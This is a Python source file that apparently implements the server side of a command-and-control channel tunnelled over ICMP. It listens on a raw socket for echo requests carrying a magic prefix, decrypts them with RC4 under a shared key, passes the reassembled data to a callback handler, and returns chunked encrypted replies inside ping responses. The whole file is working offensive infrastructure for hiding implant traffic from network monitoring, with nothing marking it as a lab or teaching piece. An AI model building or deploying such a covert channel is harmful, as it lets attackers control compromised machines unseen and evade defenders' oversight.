import socket
import os
import sys
import select
import struct
import random
import math

import config
#from config import CRYPTO_PSK
from core import encryption

from lib import logging
from lib import encryption

import navi

ICMP_REPLY = 0
ICMP_ECHO = 8

#CHUNK_SIZE = 8 * 1024 # 8 KB
CHUNK_SIZE = 100

class ICMPWrapper():

    def __init__(self, chunk_number = 1, total_chunks = 1, uid = 1, raw_data = b''):
        self.chunk_number = chunk_number
        self.total_chunks = total_chunks
        self.uid = uid 
        self.raw_data = raw_data

    def Serialize(self):
        serialized_data = struct.pack('!HHH', self.chunk_number, self.total_chunks, self.uid)
        serialized_data += self.raw_data

        return serialized_data

    def Deserialize(self, data):
        (self.chunk_number, self.total_chunks, self.uid) = struct.unpack_from('!HHH', data)
        self.raw_data = data[6 : ]

        return self.raw_data

def get_icmp_data(socket):
    socket_buffer, source_addr = socket.recvfrom(2 ** 16)

    if len(socket_buffer) == 0:
        logging.error("Empty socket buffer")
        return (None, None, None, None)

    ip_header = socket_buffer[:20]
    icmp = socket_buffer[20:]
    header = icmp[:8]
    icmp_data = icmp[8:]

    logging.success(f"Recieved ICMP from {source_addr[0]} : Length {len(icmp_data)}")

    (icmp_type, icmp_code, old_checksum, identifier, sequence_number) = struct.unpack("!BBHHH", header)

    if icmp_type != ICMP_ECHO:
        return (None, None, None, None)

    if icmp_data[:2] != b'\xFE\xFE':
        return (None, None, None, None)

    icmp_data = encryption.rc4_crypt(icmp_data[2:], (config.CRYPTO_PSK).encode())
    in_wrapper = ICMPWrapper()
    in_wrapper.Deserialize(icmp_data)

    return in_wrapper, source_addr, identifier, sequence_number

inbound_queue = {}
outbound_queue = {} # Entries are [total_chunks, chunk_number, remaining_data]

def StartICMPServer(host):
    # Create a raw socket and bind to the public interface.
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.bind((host, 0))
        if os.name == 'nt': # These are required for Windows
            sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
            sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
    except socket.error as error:
        logging.error(f'Failed to open socket for ICMP server\n{error}')
        sys.exit(1)

    logging.success("Starting ICMP Server")
    
    while True:

        (in_wrapper, source_addr, identifier, sequence_number,) = get_icmp_data(sock)
        if not in_wrapper:
            continue

        if in_wrapper.chunk_number > in_wrapper.total_chunks or in_wrapper.chunk_number > 1000 or in_wrapper.total_chunks > 1000:
            logging.warn('ICMP wrapper looks invalid. Ignoring.')
            continue

        out_wrapper = ICMPWrapper(chunk_number = 0, total_chunks = 0, uid = in_wrapper.uid)

        if in_wrapper.uid in inbound_queue.keys() or in_wrapper.total_chunks == 1:
            # We are recieving data
            logging.success(f'ICMP Request - UID: {in_wrapper.uid} | Chunk: {in_wrapper.chunk_number} | Total: {in_wrapper.total_chunks} | DataLen: {len(in_wrapper.raw_data)}')

            inbound_data = in_wrapper.raw_data

            if in_wrapper.uid in inbound_queue.keys(): # We have a running list of these
                inbound_queue[in_wrapper.uid] += in_wrapper.raw_data
                inbound_data = inbound_queue[in_wrapper.uid]

            if in_wrapper.chunk_number == in_wrapper.total_chunks: # This is the last one (or only one)
                uid = random.randint(1, 0xFFFF)
                response = navi.handle_callback(inbound_data, 'ICMP', source_addr[0])

                if len(response) < CHUNK_SIZE:
                    out_wrapper = ICMPWrapper(uid = uid, raw_data = response)
                else:
                    total_chunks = math.ceil(len(response) / CHUNK_SIZE)
                    outbound_queue[uid] = [total_chunks, 1, response[CHUNK_SIZE:]]

                    logging.success(f'Response chunking required - UID: {uid} | Total Size: {len(response)} | Chunks: {total_chunks}')

                    out_wrapper = ICMPWrapper(
                        total_chunks = outbound_queue[uid][0],
                        chunk_number = outbound_queue[uid][1],
                        uid = uid,
                        raw_data = response[:CHUNK_SIZE]
                        )

        elif in_wrapper.total_chunks > 1 and in_wrapper.chunk_number < in_wrapper.total_chunks:
            logging.success(f'ICMP Request - UID: {in_wrapper.uid} | Chunk: {in_wrapper.chunk_number} | Total: {in_wrapper.total_chunks} | DataLen: {len(in_wrapper.raw_data)}')
            inbound_queue[in_wrapper.uid] = in_wrapper.raw_data

        elif in_wrapper.uid in outbound_queue.keys():
            # We are sending data
            outbound_queue[in_wrapper.uid][1] += 1

            (total_chunks, chunk_number, remaining_data) = outbound_queue[in_wrapper.uid]

            if len(remaining_data) < CHUNK_SIZE:
                to_send = remaining_data
                del outbound_queue[in_wrapper.uid]
            else:
                to_send = remaining_data[:CHUNK_SIZE]
                outbound_queue[in_wrapper.uid][2] = remaining_data[CHUNK_SIZE:]

            logging.success(f'UID: {in_wrapper.uid} | Chunk {chunk_number} of {total_chunks} requested')

            out_wrapper = ICMPWrapper(
                total_chunks = total_chunks,
                chunk_number = chunk_number,
                uid = in_wrapper.uid,
                raw_data = to_send
                )
        

        # Serialize the wrapper and build the response
        return_data = out_wrapper.Serialize()
        return_data = encryption.rc4_crypt(return_data,  config.CRYPTO_PSK.encode())
        return_data = b'\xff\xff' + return_data

        header = struct.pack("!BBHHH", ICMP_REPLY, 0, 0, identifier, sequence_number)
        new_checksum = checksum(header + return_data)
        header = struct.pack("!BBHHH", ICMP_REPLY, 0, new_checksum, identifier, sequence_number)
        packet = header + return_data

        try:
            sock.sendto(packet, source_addr)
        except socket.error as error:
            logging.error(f'General socket failure ({error})')



def checksum(source_string):
    """
    https://github.com/mjbright/python3-ping/blob/master/ping.py
    
    A port of the functionality of in_cksum() from ping.c
    Ideally this would act on the string as a series of 16-bit ints (host
    packed), but this works.
    Network data is big-endian, hosts are typically little-endian
    """
    countTo = (int(len(source_string)/2))*2
    sum = 0
    count = 0

    # Handle bytes in pairs (decoding as short ints)
    loByte = 0
    hiByte = 0
    while count < countTo:
        if (sys.byteorder == "little"):
            loByte = source_string[count]
            hiByte = source_string[count + 1]
        else:
            loByte = source_string[count + 1]
            hiByte = source_string[count]
        try:     # For Python3
            sum = sum + (hiByte * 256 + loByte)
        except:  # For Python2
            sum = sum + (ord(hiByte) * 256 + ord(loByte))
        count += 2

    # Handle last byte if applicable (odd-number of bytes)
    # Endianness should be irrelevant in this case
    if countTo < len(source_string): # Check for odd length
        loByte = source_string[len(source_string)-1]
        try:      # For Python3
            sum += loByte
        except:   # For Python2
            sum += ord(loByte)

    sum &= 0xffffffff # Truncate sum to 32 bits (a variance from ping.c, which
                      # uses signed ints, but overflow is unlikely in ping)

    sum = (sum >> 16) + (sum & 0xffff)    # Add high 16 bits to low 16 bits
    sum += (sum >> 16)                    # Add carry from above (if any)
    answer = ~sum & 0xffff                # Invert and truncate to 16 bits
    answer = socket.htons(answer)

    return answer

